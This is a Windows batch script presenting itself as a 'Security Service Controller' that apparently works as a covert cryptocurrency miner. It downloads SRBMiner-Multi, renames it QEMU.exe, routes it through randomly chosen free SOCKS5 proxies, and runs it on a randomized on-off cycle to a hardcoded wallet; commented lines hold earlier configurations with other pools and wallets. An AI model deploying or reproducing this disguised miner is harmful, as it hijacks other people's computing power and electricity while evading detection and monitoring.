@echo off
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomscash --pool 51.79.215.200:17019 --disable-gpu --wallet scash1qf7kn4cwmxx2wsz665ucg29xx4kfaqesx9a8s85.sato --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6 --proxy 47.239.161.149:1111
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm randomx --pool 10.2.10.9:3333 --disable-gpu --wallet 86qJNmtDCDnUtaZqY9fbXxQ7DVkqm2FELeymGUx7iAwcWTB6GbaZga7KtBAZYP5Ery8LxgqKCRzp8XAefbYHbxC4CpfCPm8 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 6
#C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm xelishashv2 --pool hk.xelis.herominers.com:1225 --disable-gpu --wallet xel:9qqkym39dt5s2nsq4r6uf9vrlmj94dt48ulzs3lfrp4lwvvtyvvqq3ewgla --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 2
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -b 47.239.161.149:1111 -m nicehash -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a randomx -k
#C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
#C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 2 --never-stop --restart-on-zero-hashrate

title Security Service Controller
setlocal EnableDelayedExpansion

set BASE=%USERPROFILE%\Downloads
set ZIP=%BASE%\SRBMiner-Multi-3-1-1-win64.zip
set EXTRACT=%BASE%\SRBMiner-Multi-3-1-1
set BIN=%BASE%\QEMU.exe
set FLAG=%BASE%\security_downloaded.flag
set WINTITLE=SecurityService_QEMU

REM =========================
REM DOWNLOAD ONCE (CURL)
REM =========================

if exist "%FLAG%" goto SKIP_DOWNLOAD

echo [Security] Downloading binary...

curl -L --fail ^
 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip ^
 -o "%ZIP%"
if errorlevel 1 goto FAIL

if not exist "%ZIP%" goto FAIL

echo [Security] Extracting...

if exist "%EXTRACT%" rmdir /s /q "%EXTRACT%"

powershell -NoProfile -Command ^
 "Expand-Archive -Force '%ZIP%' '%BASE%'"
if errorlevel 1 goto FAIL

if not exist "%EXTRACT%\SRBMiner-MULTI.exe" goto FAIL

copy /y "%EXTRACT%\SRBMiner-MULTI.exe" "%BIN%" >nul

del /f /q "%ZIP%"
rmdir /s /q "%EXTRACT%"

echo OK>"%FLAG%"
echo [Security] Binary ready.

goto SKIP_DOWNLOAD

:FAIL
echo.
echo ===== ERROR =====
echo Download or extract failed.
echo =================
pause

:SKIP_DOWNLOAD

REM =========================
REM CONFIG
REM =========================
set WORK=%BASE%\proxy_work
set PROXY_URL=https://github.com/iplocate/free-proxy-list/raw/refs/heads/main/all-proxies.txt
set LIST=%WORK%\all.txt
set SOCKS=%WORK%\socks5.txt
set GOOD=%WORK%\good.txt

if not exist "%WORK%" mkdir "%WORK%"

REM =========================
REM DOWNLOAD LIST
REM =========================
echo [INFO] Downloading proxy list...
curl -L --fail "%PROXY_URL%" -o "%LIST%" || goto FAIL

REM =========================
REM FILTER ALL SOCKS5
REM =========================
echo [INFO] Extracting SOCKS5 proxies...
findstr /i "^socks5://" "%LIST%" > "%SOCKS%"

for %%A in ("%SOCKS%") do if %%~zA==0 goto FAIL

REM =========================
REM TEST PROXIES
REM =========================
echo [INFO] Testing SOCKS5 proxies...
> "%GOOD%" echo.

for /f "usebackq delims=" %%P in ("%SOCKS%") do (
    set P=%%P
    set P=!P:socks5://=!

    curl --silent --max-time 2 ^
      --socks5-hostname !P! https://api.ipify.org >nul 2>&1

    if not errorlevel 1 (
        echo [OK] !P!
        echo !P!>>"%GOOD%"
    )
)

echo ========================================
echo   Security Service Controller STARTED
echo ========================================

:SECURITY_LOOP

REM =========================
REM PICK RANDOM GOOD PROXY
REM =========================
call :PICK_PROXY
if errorlevel 1 goto FAIL

echo ----------------------------------------
echo [Security] Service running
echo ----------------------------------------

start "%WINTITLE%" "%BIN%" ^
 --algorithm rinhash ^
 --pool rinhash.sea.mine.zpool.ca:7444 ^
 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
 --password c=LTC,d=0.001 ^
 --disable-gpu ^
 --nicehash false ^
 --keepalive true ^
 --disable-startup-monitor ^
 --disable-huge-pages ^
 --disable-msr-tweaks ^
 --cpu-threads 6 ^
 --cpu-threads-intensity 1 ^
 --cpu-threads-priority 1 ^
 --miner-priority 1 ^
 --proxy !PROXY!

REM Wait 18–22 minutes
set /a RUN1=1080 + (%RANDOM% %% 241)
timeout /t %RUN1% /nobreak

echo [Security] Stopping service...
taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1

echo [Security] Idle 12–18 minutes...
set /a IDLE1=720 + (%RANDOM% %% 361)
echo [Security] Idle (phase 1) for %IDLE1% seconds...
timeout /t %IDLE1% /nobreak

REM =========================
REM PICK RANDOM GOOD PROXY
REM =========================
call :PICK_PROXY
if errorlevel 1 goto FAIL

echo ----------------------------------------
echo [Security] Service running
echo ----------------------------------------

start "%WINTITLE%" "%BIN%" ^
 --algorithm rinhash ^
 --pool rinhash.sea.mine.zpool.ca:7444 ^
 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
 --password c=LTC,d=0.001 ^
 --disable-gpu ^
 --nicehash false ^
 --keepalive true ^
 --disable-startup-monitor ^
 --disable-huge-pages ^
 --disable-msr-tweaks ^
 --cpu-threads 6 ^
 --cpu-threads-intensity 1 ^
 --cpu-threads-priority 1 ^
 --miner-priority 1 ^
 --proxy !PROXY!

REM Wait 17–23 minutes
set /a RUN2=1020 + (%RANDOM% %% 361)
timeout /t %RUN2% /nobreak

echo [Security] Stopping service...
taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1

echo [Security] Idle 12–18 minutes...
set /a IDLE2=720 + (%RANDOM% %% 361)
echo [Security] Idle (phase 2) for %IDLE2% seconds...
timeout /t %IDLE2% /nobreak

goto SECURITY_LOOP

:PICK_PROXY
set COUNT=0

for /f "usebackq delims=" %%G in ("%GOOD%") do (
    set /a COUNT+=1
)

if !COUNT! EQU 0 (
    echo [ERROR] No working SOCKS5 proxy found.
    exit /b 1
)

set /a PICK=%RANDOM% %% !COUNT!
set IDX=0

for /f "usebackq delims=" %%G in ("%GOOD%") do (
    if !IDX! EQU !PICK! (
        set "PROXY=%%G"
        goto PICK_DONE
    )
    set /a IDX+=1
)

:PICK_DONE
echo.
echo ========================
echo PROXY SET TO:
echo !PROXY!
echo ========================
exit /b 0


